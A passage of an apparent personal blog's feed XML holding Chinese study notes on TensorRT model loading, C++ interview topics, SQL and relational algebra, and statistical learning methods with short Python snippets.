class="line">tempStream.read((<span class="keyword">char</span>*)modelMem, modelSize);</span><br><span class="line"></span><br><span class="line">IRuntime* runtime = createInferRuntime(gLogger);</span><br><span class="line"><span class="keyword">if</span> (runtime == <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line">DebugP(<span class="string">"Build Runtime Failure"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (gArgs.useDLACore &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">runtime-&gt;setDLACore(gArgs.useDLACore);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ICudaEngine* engine = runtime-&gt;deserializeCudaEngine(modelMem, modelSize, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (engine == <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line">DebugP(<span class="string">"Build Engine Failure"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IExecutionContext* context = engine-&gt;createExecutionContext();</span><br><span class="line"><span class="keyword">if</span> (context == <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line">DebugP(<span class="string">"Build Context Failure"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TensorRT* trt = <span class="keyword">new</span> TensorRT();</span><br><span class="line">trt-&gt;context = context;</span><br><span class="line">trt-&gt;engine = engine;</span><br><span class="line">trt-&gt;runtime = runtime;</span><br><span class="line">DebugP(<span class="string">"Build trt Model Success!"</span>);</span><br><span class="line"><span class="keyword">return</span> trt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些单目三维重建的概念，及DepthEstimation代码的阅读&lt;/p&gt;
    
    </summary>
    
      <category term="3DPointCloud" scheme="http://waynamigo.github.io/categories/3DPointCloud/"/>
    
    
      <category term="3DPointclouod" scheme="http://waynamigo.github.io/tags/3DPointclouod/"/>
    
      <category term="DeepLearning" scheme="http://waynamigo.github.io/tags/DeepLearning/"/>
    
      <category term="DepthEstimation" scheme="http://waynamigo.github.io/tags/DepthEstimation/"/>
    
  </entry>
  
  <entry>
    <title>跨媒体检索/多模态计算 方向动态</title>
    <link href="http://waynamigo.github.io/2021/04/08/2021-04-08-%E5%9B%BE%E5%83%8F%E8%A7%86%E9%A2%91%E4%BF%A1%E6%81%AF%E6%8F%90%E5%8F%96%E4%B8%8E%E6%A3%80%E7%B4%A2/"/>
    <id>http://waynamigo.github.io/2021/04/08/2021-04-08-图像视频信息提取与检索/</id>
    <published>2021-04-07T16:00:00.000Z</published>
    <updated>2021-07-26T02:07:14.652Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面：跨媒体检索方向涵盖许多任务，涉及到图像、文本、语音、视频等多种模态的数据，事实上，根据项目需求，开发者可以将所需的识别、分割、生成、编码方法集成到检索项目中。本文整理了在网络上能搜集到的Baidu、Youtube、Google、Facebook检索系统和大数据架构实现方案，给以后的工作方向做参考。</p><a id="more"></a><p>资料来源：架构大数据 赵勇</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;写在前面：跨媒体检索方向涵盖许多任务，涉及到图像、文本、语音、视频等多种模态的数据，事实上，根据项目需求，开发者可以将所需的识别、分割、生成、编码方法集成到检索项目中。本文整理了在网络上能搜集到的Baidu、Youtube、Google、Facebook检索系统和大数据架构实现方案，给以后的工作方向做参考。&lt;/p&gt;
    
    </summary>
    
      <category term="其他" scheme="http://waynamigo.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="ML" scheme="http://waynamigo.github.io/tags/ML/"/>
    
      <category term="DL" scheme="http://waynamigo.github.io/tags/DL/"/>
    
      <category term="Paper" scheme="http://waynamigo.github.io/tags/Paper/"/>
    
      <category term="MultiModal" scheme="http://waynamigo.github.io/tags/MultiModal/"/>
    
      <category term="MultiMedia" scheme="http://waynamigo.github.io/tags/MultiMedia/"/>
    
  </entry>
  
  <entry>
    <title>CPP面试知识点</title>
    <link href="http://waynamigo.github.io/2021/03/26/2021-03-26-cpp%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86/"/>
    <id>http://waynamigo.github.io/2021/03/26/2021-03-26-cpp面试知识/</id>
    <published>2021-03-25T16:00:00.000Z</published>
    <updated>2021-06-26T10:12:03.715Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新</p><a id="more"></a><h2 id="概念性区分"><a href="#概念性区分" class="headerlink" title="概念性区分"></a>概念性区分</h2><p><strong>1.C和C++的区别</strong><br>C面向过程，C++面向对象<br>C的内存管理使用malloc free，C++还可以使用new delete<br>C不支持函数重载，C++支持函数重载<br>C没有引用，C++可以用引用<br><strong>堆和栈的区别</strong><br>stack编译器自动分配和释放，自底向上的数据结构<br>heap需要由程序员手动new delete，会产生外部碎片，是自上到下的数据结构<br><strong>c++中不能被继承的成员函数</strong><br>析构函数和构造函数<br><strong>const</strong><br>定义常量<br>修饰函数参数和函数返回值</p><h2 id="修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值"><a href="#修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值" class="headerlink" title="修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值"></a>修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值</h2><p>define给一个立即数，const是常量，放在静态区域，全局变量也在静态区域<br>静态区：static无论是全局变量还是局部变量都存储在全局/静态区域，在编译期就为其分配内存，在程序结束时释放<br>const的全局变量存储在只读数据段，第一次使用时被分配内存，结束时释放；const的局部变量存在栈中，代码块结束释放<br>define定义的常量不可以用指针去指向，const定义的常量可以用指针去指向该常量的地址<br>–const优点<br>const 常量有数据类型，而宏常量没有数据类型。<br>编译器可以对前者进行类型安全检查，<br>后者只进行字符替换，没有类型安全检查，并且在字符替换可能报错。<br>[全局变量放在静态存储区，整个程序开始分配内存，结束释放]<br><strong>static</strong><br>static修饰的变量只能通过其所在文件、模块或函数进行调用，限制变量<br>static修饰的变量一开始就得初始化，并存放于静态内存区<br><strong>volatile</strong><br>本条指令不会因编译器的优化而省略，不会被编译器察觉（隐藏变量），且要求每次重新读取volatile修饰的变量的内容<br><strong>extern</strong></p><p><strong>指针和引用的区别</strong><br>引用本质是只读指针，引用只能在初始化时被赋值,且必须被初始化，之后不能改变，指针是动态的<br>引用不能为NULL，指针可以<br>引用做函数参数时，内部传递的是变量地址<br><strong>进程间通信</strong><br>pipe管道，半双工，用于父子进程通信<br>semaphore信号量，进程同步访问共享资源<br>message que 消息队列，克服了缓冲区限制<br>shared memory共享内存<br>socket<br><strong>线程间通信</strong><br>全局变量   Messages消息机制；<br>CEvent对象（MFC中的一种线程通信对象，通过其触发状态的改变实现同步与通信）</p><p>编译时运算符:sizeof</p><p><strong>写一个函数指针</strong><br><em>( ( void (</em>)() ) 0x100000) ( );<br>void(<em>)()强制转换0x100000<br>typedef void(</em>)() voidFunc;<br>*(  (voidFunc)0x100000 )();</p><p><strong>内存分配方式</strong></p><p>从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量。</p><p>在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。</p><p>从堆上分配，亦称动态内存分配。程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由我们决定，使用非常灵活，但问题也最多。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;持续更新&lt;/p&gt;
    
    </summary>
    
      <category term="CPP" scheme="http://waynamigo.github.io/categories/CPP/"/>
    
    
      <category term="CPP，面试" scheme="http://waynamigo.github.io/tags/CPP%EF%BC%8C%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>模型集成策略</title>
    <link href="http://waynamigo.github.io/2021/01/12/2021-01-12-%E6%A8%A1%E5%9E%8B%E9%9B%86%E6%88%90/"/>
    <id>http://waynamigo.github.io/2021/01/12/2021-01-12-模型集成/</id>
    <published>2021-01-11T16:00:00.000Z</published>
    <updated>2021-07-16T13:55:00.514Z</updated>
    
    <content type="html"><![CDATA[<p>新坑</p><a id="more"></a><h2 id="stacking"><a href="#stacking" class="headerlink" title="stacking"></a>stacking</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;新坑&lt;/p&gt;
    
    </summary>
    
      <category term="ML" scheme="http://waynamigo.github.io/categories/ML/"/>
    
    
      <category term="ML" scheme="http://waynamigo.github.io/tags/ML/"/>
    
      <category term="DL" scheme="http://waynamigo.github.io/tags/DL/"/>
    
      <category term="stacking" scheme="http://waynamigo.github.io/tags/stacking/"/>
    
  </entry>
  
  <entry>
    <title>数据库系统相关</title>
    <link href="http://waynamigo.github.io/2021/01/11/2021-01-11-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://waynamigo.github.io/2021/01/11/2021-01-11-数据库/</id>
    <published>2021-01-10T16:00:00.000Z</published>
    <updated>2021-01-13T07:10:42.630Z</updated>
    
    <content type="html"><![CDATA[<p>关于计算机研究生复试的数据库相关问题（笔试）</p><a id="more"></a><h2 id="系统概念相关"><a href="#系统概念相关" class="headerlink" title="系统概念相关"></a>系统概念相关</h2><p>数据视图<br>数据抽象： 物理层–&gt;逻辑层–&gt;视图层<br>实例和模式：物理模式–&gt;逻辑模式–&gt;子模式<br>数据集合是实例(Instance)， 数据库总体设计为数据库模式(Schema)<br>数据模型： 关系模型  实体-联系模型（E-R)  基于对象的模型  半结构化数据模型</p><h2 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h2><p>域：关系中的某属性允许取值的集合<br><strong>码</strong>：整个关系中区分不同元组的一种性质<br>超码 super key：一个或多个属性的集合，唯一标识一个元组,允许有多余的属性<br>候选码 candidate key：允许最少必要属性的超码即候选码比如{ID}{name,seat}是两个候选码<br>主码 primary key：设计者在一个关系内的候选码中选择的区分元组的属性组合<br>主码选择原则：选择那些值从不改变或极少改变的候选码作primary key<br>外码 foreign key：一个关系内的某属性是另一个关系的主码</p><p><strong>关系代数</strong></p><ul><li>选择元组/属性 σ</li><li>投影 π</li><li>自然连接 ∞</li><li>笛卡尔积 X</li><li>集合运算 交 并</li></ul><h2 id="自然连接举例"><a href="#自然连接举例" class="headerlink" title="自然连接举例"></a>自然连接举例</h2><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th></th><th align="center">D</th><th align="center">B</th><th align="center">E</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">a</td><td align="center">3</td><td></td><td align="center">2</td><td align="center">c</td><td align="center">7</td></tr><tr><td align="center">2</td><td align="center">b</td><td align="center">6</td><td></td><td align="center">3</td><td align="center">d</td><td align="center">5</td></tr><tr><td align="center">3</td><td align="center">c</td><td align="center">7</td><td></td><td align="center">1</td><td align="center">a</td><td align="center">3</td></tr><tr><td align="center">* 计算笛卡尔积</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">* 选出左B=右B的元组，不等的不算，忽略掉</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">* 合并该元组，成为新元组 A B C D E ，成为新元组的只有两组</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">1</td><td align="center">a</td><td align="center">3</td><td>1</td><td align="center">3</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">c</td><td align="center">7</td><td>2</td><td align="center">7</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">## SQL相关</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">自然连接 nature join 和join using(某个属性)</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">并运算：union 自动去重 union all 可以保留重复</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">交运算：intersect 自动去重 intersect all 可保留重复</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">差运算：except 自动去重 except all 可保留重复</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>聚集函数：sum, min , max , count , avg<br>分组聚集： group by中没有出现的属性，只要是出现在select中，必须在聚集函数内部的形式出现,比如b,c没出现在group by 内部，用例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a,<span class="keyword">avg</span>(b),<span class="keyword">sum</span>(c) <span class="keyword">from</span> table1 <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure><p>集合成员资格：in ,not in<br>集合比较：some运算,用例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ID</span> <span class="keyword">from</span> instructor </span><br><span class="line"><span class="keyword">where</span> salary &gt;<span class="keyword">some</span> (<span class="keyword">select</span> salary <span class="keyword">from</span> instructor </span><br><span class="line">    <span class="keyword">where</span> department = <span class="string">'bio'</span>);</span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> T.ID <span class="keyword">from</span> instructor <span class="keyword">as</span> T,instructor <span class="keyword">as</span> S </span><br><span class="line"><span class="keyword">where</span> S.department =<span class="string">'bio'</span> <span class="keyword">and</span> T.salary &gt;S.salary;</span><br></pre></td></tr></table></figure><p>空关系测试：exists, not exists,测试子查询结果中是否存在元组，用例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DSC黑书第六版中的，“找出选修了bio系开设的所有课程的学生”（表在官网</span><br><span class="line"><span class="keyword">select</span> S.ID,S.name <span class="keyword">from</span> student <span class="keyword">as</span> S </span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>( (<span class="keyword">select</span> course_id <span class="keyword">from</span> course</span><br><span class="line">   <span class="keyword">where</span> dep_name = <span class="string">'bio'</span>)//找出bio系开设的所有课程</span><br><span class="line">   <span class="keyword">except</span></span><br><span class="line">       (<span class="keyword">select</span> T.course_id <span class="keyword">from</span> takes <span class="keyword">as</span> T</span><br><span class="line">   <span class="keyword">where</span> S.ID = T.ID) );//找出S.ID选修的所有课程</span><br></pre></td></tr></table></figure><p>重复元组存在性测试：unique，测试子查询返回集合是否有重复元组，无则返回true；not unique则相反</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DSC黑书第六版中的，“找出所有在2019年最多开设一次的课程”</span><br><span class="line"><span class="keyword">select</span> C.course_id <span class="keyword">from</span> course <span class="keyword">as</span> C</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">unique</span> (<span class="keyword">select</span> S.course_id <span class="keyword">from</span> <span class="keyword">section</span> <span class="keyword">as</span> S</span><br><span class="line">      <span class="keyword">where</span> C.course_id =S.course_id  <span class="keyword">and</span> S.year =<span class="number">2019</span>);</span><br></pre></td></tr></table></figure><p>标量子查询：子查询只返回包括【单个属性】的【单个元组】，只可以出现在select where having三种子句中</p><h2 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于计算机研究生复试的数据库相关问题（笔试）&lt;/p&gt;
    
    </summary>
    
      <category term="其他" scheme="http://waynamigo.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="笔试" scheme="http://waynamigo.github.io/tags/%E7%AC%94%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>统计学习笔记</title>
    <link href="http://waynamigo.github.io/2020/09/11/2020-09-12-statics_note/"/>
    <id>http://waynamigo.github.io/2020/09/11/2020-09-12-statics_note/</id>
    <published>2020-09-10T16:00:00.000Z</published>
    <updated>2021-07-16T13:40:15.137Z</updated>
    
    <content type="html"><![CDATA[<p>该笔记是对李航统计学习方法和All of Statics做的学习笔记，简单进行相关算法实验，加强理解，查缺补漏等，内容尽量精炼</p><a id="more"></a><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="生成模型与判别模型"><a href="#生成模型与判别模型" class="headerlink" title="生成模型与判别模型"></a>生成模型与判别模型</h3><p>generative model和discriminative model$（以下分别表示为G和D）$<br>$G\ $常见的有朴素贝叶斯，隐马尔科夫模型，高斯混合、 LDA、 Restricted Boltzmann Machine等<br>$D\ $有Kmeans，感知机，决策树，最大熵模型，Logistic回归、SVM、 boosting、条件随机场、神经网络等<br>两者的本质区别及特点：<br>$G\ $的流程是<strong>学习X和Y的联合概率分布$P(x,y)$得出$P(y|x)$最直接的例子就是Naive Bayes</strong>，由于生成的结果是联合分布$P(x,y)$，可以计算边缘分布$P(x)$进行异常值检测，若$P(x)$太小，就判定可能不适合这一类样本所代表的数据。<br>$D\ $的流程是<strong>直接由给定的X，Y学习决策函数或$P(y|x)$，是一种黑盒操作，准确率高，可以将允许对问题进行抽象处理，最熟悉的例子就是Neural Network</strong></p><h3 id="分类问题和回归问题"><a href="#分类问题和回归问题" class="headerlink" title="分类问题和回归问题"></a>分类问题和回归问题</h3><p>分类用CrossEntropy，回归用Mean Square Error等等</p><h3 id="范数-norm"><a href="#范数-norm" class="headerlink" title="范数 norm"></a>范数 norm</h3><p>$L1范数 \sum{|x_i|}$<br>$L2范数 \sqrt{x_{1}^{2} + x_{2}^{2} + … + x_{n}^{2}}$<br>$L_\infty无穷范数MAX{|x_i|}$<br>范数理论推论$L1\geq{L2\geq{L_\infty}}$<br>对于numpy的线性代数库，有几种求范数的方法，主要就是求这三种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.linalg.norm(x, ord=<span class="literal">None</span>, axis=<span class="literal">None</span>, keepdims=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>axis=0表示对矩阵x的每一列求范数，axis=1表示对矩阵的每一行求范数， keeptdims=True表示结果保留维度，keepdims=False表示结果不保留维度</p><h3 id="最小二乘"><a href="#最小二乘" class="headerlink" title="最小二乘"></a>最小二乘</h3><p>是解决曲线拟合问题、最小化cost的优化方法，使求得的数据与实际数据之间的误差平方和最小，应用范围非常广泛。<br>$设(x,y)为一组观测量，x=[x_0,x_1,…,x_n]^T,寻找一个函数y=f(x,w)$ ，使$尽可能逼近曲线(x,y),其中w=[w_0,w_1,…,w_n]^T$，为待估计参数，求解<br>使残差函数$$L(y,f(x,w))=\sum{[y_i-f(x_i,w_i)]^2}$$得到<strong>全局</strong>最小值的$w$,直观上就是每个点与拟合曲线的欧氏距离的平方和。</p><p><em>与梯度下降的区别：</em><br>最小二乘法是指对$\Delta$求导找出函数全局最小的w，梯度下降是先给定一个w（初始化），经过N次梯度下降后找到的使函数局部最小的w。相对的，梯度下降适用于大规模数据，最小二乘适用于较小样本，不过梯度下降的缺点是到最小点的时候收敛速度变、对初始点的选择极为敏感两个方面。</p><h2 id="感知机-perceptron"><a href="#感知机-perceptron" class="headerlink" title="感知机 perceptron"></a>感知机 perceptron</h2><p>属于$Discriminative \ Model$的线性分类模型，输入是表示一个Instance的特征向量，求出分离特征的超平面，公式表示为：<br>$f(x) = sign(w*x+b)$<br>$\begin{eqnarray}<br>sign(x)=  \begin{cases}<br>1,&amp;x\geq{0}  \cr<br>-1 ,&amp;x&lt;0<br>\end{cases}<br>\end{eqnarray}$<br>这种perceptron叠起来就相当于是全连接的MLP(Multi-Layer Perceptron)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/MLP.gif" alt title>                </div>                <div class="image-caption"></div>            </figure><p>n多个线性函数叠加，对应矩阵运算$W\cdot x + B$，$W是w权重矩阵，B是bias的列向量，激活函数对应单个感知机的sign函数$</p><h2 id="k-近邻-k-nearest-neighbor"><a href="#k-近邻-k-nearest-neighbor" class="headerlink" title="k-近邻 k nearest neighbor"></a>k-近邻 k nearest neighbor</h2><p>还是属于$Discriminative \ Model$的模型，复杂度为$O(n^2)$，由三个基本要素组成：<strong>距离度量、k值、分类规则</strong><br>距离度量，设有向量x1和x2，则：<br>欧氏距离<code>np.sqrt(np.sum(np.square(x1 - x2)))</code><br>或直接<code>np.linalg.norm(x1-x2)</code>（用numpy的线性代数库求L2范数，但后者较慢）<br>曼哈顿距离<code>np.sum(x1 - x2)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">input:px,k</span><br><span class="line"><span class="keyword">return</span>:bestx</span><br><span class="line"><span class="comment"># get N(x):涵盖最近的k个点的邻域，即KList</span></span><br><span class="line">distList = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> X:</span><br><span class="line">distList.append(np.sqrt(np.sum(np.square(px - x))))</span><br><span class="line">KList = np.argsort(np.array(distList))[:k]</span><br><span class="line"><span class="comment"># 决策规则I:由KList得出bestx，以类别分类问题为例，选N(x)最多类别为结果</span></span><br><span class="line">X(np.argmax(np.bincount(X(i))))</span><br></pre></td></tr></table></figure><p>如果要求多个最大值索引<br><code>np.where(a == np.amax(a))[0]</code>，或者<code>np.argwhere(a == np.amax(a))</code></p><h3 id="kd-tree"><a href="#kd-tree" class="headerlink" title="kd tree"></a>kd tree</h3><p>存储k维空间数据的树结构，实现如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">伪码写好了（？），但是按手里的数据感觉不太好写，回头看看别人有没有demo，先摸了</span><br></pre></td></tr></table></figure><h2 id="朴素贝叶斯-Naive-Bayes"><a href="#朴素贝叶斯-Naive-Bayes" class="headerlink" title="朴素贝叶斯 Naive Bayes"></a>朴素贝叶斯 Naive Bayes</h2><p>属于$Generative \ Model$一类，给的是联合分布$P(x,y)$，学过概率论的应该都会，普通的算法实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">input:</span><br><span class="line">先验概率分布P__y : P(Y=c)，条件概率分布P_x_y : P(X=x|Y=c)，dim_f:特征维度</span><br><span class="line">c_num：分类数目，data:数据list，label:标签list，以[<span class="number">0</span>,<span class="number">1</span>,...,<span class="number">9</span>]为例</span><br><span class="line"><span class="keyword">return</span>:max P</span><br><span class="line"></span><br><span class="line"><span class="comment">#求出先验分布，并对数化，经常使用的对乘法处理的方式</span></span><br><span class="line">P__y = [[(np.sum(label == np.asarray(i)))/(len(label))] \</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(c_num)]</span><br><span class="line">P__y = np.log(P__y)</span><br><span class="line"><span class="comment">#求出条件分布</span></span><br><span class="line">P_x_y = np.zeros((c_num, dim_f, <span class="number">2</span>))  </span><br><span class="line"><span class="comment">#对标记集进行遍历  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(label)):  </span><br><span class="line">    <span class="comment">#获取当前循环所使用的标记  </span></span><br><span class="line">c = label[i]  </span><br><span class="line">    <span class="comment">#获取当前要处理的样本</span></span><br><span class="line">x = data[i]  </span><br><span class="line">    <span class="comment">#对该样本的每一维feature进行遍历</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(dim_f):  </span><br><span class="line">        <span class="comment">#先在矩阵中对应位置加1</span></span><br><span class="line">P_x_y[c][j][x[j]] += <span class="number">1</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(c_num):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(dim_f):  </span><br><span class="line">P_x_y0 = P_x_y[c][j][<span class="number">0</span>]  </span><br><span class="line">P_x_y1 = P_x_y[c][j][<span class="number">1</span>]  </span><br><span class="line">P_x_y[c][j][<span class="number">0</span>] = np.log((P_x_y0 + <span class="number">1</span>) / (P_x_y0 + P_x_y1 + <span class="number">2</span>))</span><br><span class="line">P_x_y[c][j][<span class="number">1</span>] = np.log((P_x_y1 + <span class="number">1</span>) / (P_x_y0 + P_x_y1 + <span class="number">2</span>))</span><br><span class="line"><span class="comment"># pick up最大Probability</span></span><br><span class="line">P = [<span class="number">0</span>] * c_num</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(c_num):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(dim_f):</span><br><span class="line">sum += P_x_y[i][j][x[j]]  </span><br><span class="line">P[i] = sum + P__y[i] </span><br><span class="line">res = P.index(np.amax(P))</span><br></pre></td></tr></table></figure><h2 id="决策树-Decision-Tree-及剪枝"><a href="#决策树-Decision-Tree-及剪枝" class="headerlink" title="决策树 Decision Tree 及剪枝"></a>决策树 Decision Tree 及剪枝</h2><p>决策树是经常在kaggle以及实际应用中很广泛且有效的算法，决策树通常包括3个步骤:<strong>特征选择、构造、剪枝</strong>，<del>无内鬼，直接进行一个sklearn.tree的import</del>，sklearn的tree里封装了BaseDecisionTree，在此基础上进一步封装了DecisionTreeClassifier和DecisionTreeRegressor：分类器和回归器，做kaggle是确实好用。</p><h3 id="特征选择：特征选择的准则是信息增益（information-gain）或信息增益比。"><a href="#特征选择：特征选择的准则是信息增益（information-gain）或信息增益比。" class="headerlink" title="特征选择：特征选择的准则是信息增益（information gain）或信息增益比。"></a>特征选择：特征选择的准则是信息增益（information gain）或信息增益比。</h3><p>$设离散型X的概率分布P(X =x_i)=p_i$<br>$Entropy的定义为H(X)=\sum{p_i\log{p_i}}$</p><h3 id="决策树构造"><a href="#决策树构造" class="headerlink" title="决策树构造"></a>决策树构造</h3><h4 id="ID3"><a href="#ID3" class="headerlink" title="ID3"></a>ID3</h4><p>各个节点用信息增益H(D)准则选择特征，递归构建决策树。<br>ID3算法的核心是在决策树各个结点上应用信息增益准则选择特征，递归地构建决策<br>树。具体方法是：从根结点（root node）开始，对结点计算所有可能的特征的信息增益， 选择信息增益最大的特征作为结点的特征，由该特征的不同取值建立子结点；再对子结点递归调用该方法，直到所有feature被用完或剩余feature的信息增益很小或少于自己设置的阈值，决策树建立完成，缺点是只生成了树，没有【】容易过拟合。</p><h4 id="C4-5"><a href="#C4-5" class="headerlink" title="C4.5"></a>C4.5</h4><p>各个节点用信息增益比选择特征，递归构建决策树，递归函数流程和ID3一样，只是评估标准换成了H(D|A)</p><h4 id="CART"><a href="#CART" class="headerlink" title="CART"></a>CART</h4><p>对回归树用<strong>平方最小误差</strong>原则，对分类树用<strong>基尼指数最小化</strong>原则进行特征选择。</p><h3 id="剪枝"><a href="#剪枝" class="headerlink" title="剪枝"></a>剪枝</h3><p>去掉过于细分的叶结点，使其回退到父结点，甚至更高的结点，然后将父结点或更高的结点改为新的叶结点。</p><p>但是自己还是得从0实现一个决策树，以后用的时候心里有点B数。<br>数据用colab的sampledata里california_housing那个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Logistic-Regression"><a href="#Logistic-Regression" class="headerlink" title="Logistic Regression"></a>Logistic Regression</h2><p>熟悉的Logistic回归，以二分类任务为例，就是用sigmoid函数把结果映射到(-1,1)；多分类任务下，将该二分类任务的sigmoid推广到了softmax函数    ，就是我们熟悉的softmax激活函数。<br>$$Sigmoid(z) = \frac{1}{1+exp(-z)},z=w^T\cdot x,(alias\ Sigmoid(z)=h_w(x))$$<br>$$gradient\ descent:<br>\Delta = x_i \cdot y_i - \frac{np.exp(w\cdot x_i) * x_i)}{ ( 1 + np.exp(w\cdot x_i))}then, \ w=w+lr\cdot\Delta$$<br>或者<br>$$LikelihoodFunc:J(w) =-\frac{1}{m}\sum\limits_{i=1}^{m}{[y_ilog(h_w(x_i))+(1-y_i)log(1-h_w(x_i))]}$$</p><p>$$partial:\frac{\partial J\left(w \right)}{\partial 